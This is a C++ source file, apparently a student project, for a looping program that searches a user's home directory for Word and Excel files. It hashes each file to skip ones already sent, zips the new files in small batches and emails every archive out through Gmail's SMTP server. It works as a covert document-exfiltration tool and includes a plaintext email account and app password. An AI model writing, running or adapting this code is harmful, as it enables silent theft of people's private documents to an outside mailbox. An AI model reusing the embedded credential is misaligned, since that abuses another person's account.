#include <iostream>
#include <filesystem>
#include <fstream>
#include <vector>
#include <zip.h>
#include <curl/curl.h>
#include <openssl/sha.h>
#include <algorithm>
#include <cctype>
#include <thread>
namespace fs = std::filesystem;

std::vector<std::string> file_paths;
std::vector<std::string> file_hashes;
int batch = 1;
using namespace std;
bool has_target_extension(const fs::path& p)
{
    auto ext = p.extension().string();
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

    return ext == ".docx" || ext == ".xlsx";
}

std::string sha256_file(const std::string& path)
{
    std::ifstream f(path, std::ios::binary);
    if (!f) return {};

    SHA256_CTX ctx;
    SHA256_Init(&ctx);

    std::vector<char> buf(4096);
    while (f.read(buf.data(), buf.size()) || f.gcount())
    {
        SHA256_Update(&ctx, buf.data(), f.gcount());
    }

    unsigned char hash[32];
    SHA256_Final(hash, &ctx);

    std::string out;
    static const char* hex = "0123456789abcdef";
    out.reserve(64);

    for (auto b : hash)
    {
        out.push_back(hex[b >> 4]);
        out.push_back(hex[b & 0xF]);
    }

    return out;
}

void save_hashes_to_file(const vector<string>&hashes)
{
  ofstream out("/home/tung/MyZipOutput/hashes.txt",std::ios::trunc);
  for (const auto& h : hashes)
     out << h << "\n";
}

void load_hashes_from_file(vector<string>&hashes)
{
  ifstream in("/home/tung/MyZipOutput/hashes.txt");
  string line;
  while(getline(in,line))
  {
    if(!line.empty())
   {
    hashes.push_back(line);
   }
  }
}



void scan_dir(const std::string& root)
{
    for (auto& entry : fs::recursive_directory_iterator(root,
             fs::directory_options::skip_permission_denied))
    {
        if (!entry.is_regular_file()) continue;

        if (!has_target_extension(entry.path()))
            continue;

        std::string h = sha256_file(entry.path().string());

        if (std::find(file_hashes.begin(), file_hashes.end(), h) == file_hashes.end())
        {
            file_paths.push_back(entry.path().string());
            file_hashes.push_back(h);
            save_hashes_to_file(file_hashes);

            std::cout << entry.path() << std::endl;
        }
    }
}

bool add_file(zip_t* archive, const std::string& path)
{
    zip_source_t* src = zip_source_file(archive, path.c_str(), 0, 0);
    if (!src) return false;

    fs::path p(path);

    if (zip_file_add(archive, p.filename().string().c_str(), src,
                     ZIP_FL_OVERWRITE | ZIP_FL_ENC_UTF_8) < 0)
    {
        zip_source_free(src);
        return false;
    }
    return true;
}


bool sendEmail_one_file(const std::string& path)
{
    CURL *curl = curl_easy_init();
    if(!curl) return false;

    // SMTP server Gmail
    curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com:465");
    curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);

    // tài khoản Gmail
    curl_easy_setopt(curl, CURLOPT_USERNAME, "n21dcat067@student.ptithcm.edu.vn");
    curl_easy_setopt(curl, CURLOPT_PASSWORD, "fkkj fwcl aocs jfpz");

    // người gửi
    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, "n21dcat067@student.ptithcm.edu.vn");

    // người nhận
    struct curl_slist *recipients = NULL;
    recipients = curl_slist_append(recipients, "n21dcat067@student.ptithcm.edu.vn");
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

    // tạo MIME
    curl_mime *mime = curl_mime_init(curl);

    // body text
    curl_mimepart *part = curl_mime_addpart(mime);
    curl_mime_data(part, "Linux test mail with attachment", CURL_ZERO_TERMINATED);

    // file đính kèm
    curl_mimepart *filepart = curl_mime_addpart(mime);
    curl_mime_filedata(filepart, path.c_str());
    curl_mime_type(filepart, "application/octet-stream");

    // tên file hiển thị
    std::filesystem::path p(path);
    curl_mime_filename(filepart, p.filename().string().c_str());

    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    // timeout optional
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);

    CURLcode res = curl_easy_perform(curl);

    curl_mime_free(mime);
    curl_slist_free_all(recipients);
    curl_easy_cleanup(curl);

    return res == CURLE_OK;
}


void compress_chunks()
{
    fs::create_directories("/home/tung/MyZipOutput");

    const size_t chunk = 2;
    

    for (size_t i = 0; i < file_paths.size(); i += chunk)
    {
        std::string zipname = "/home/tung/MyZipOutput/batch_" + std::to_string(batch) + ".zip";

        int err = 0;
        zip_t* ar = zip_open(zipname.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);

        for (size_t j = i; j < i + chunk && j < file_paths.size(); ++j)
            add_file(ar, file_paths[j]);

        zip_close(ar);

        std::cout << "Created: " << zipname << std::endl;
        sendEmail_one_file(zipname);

        batch++;
    }
}

int main()
{
    while(true)
    {
        file_paths.clear();
        std::string hashes_path = std::string(std::getenv("HOME")) + "/MyZipOutput/hashes.txt";
        if(fs::exists(hashes_path))
        {
           load_hashes_from_file(file_hashes);
        }
    	
       // ví dụ: chỉ quét HOME chứ không quét /
    	scan_dir(std::getenv("HOME"));

    	compress_chunks();
    	std::this_thread::sleep_for(std::chrono::seconds(10));
    	
    }
    
    return 0;
}
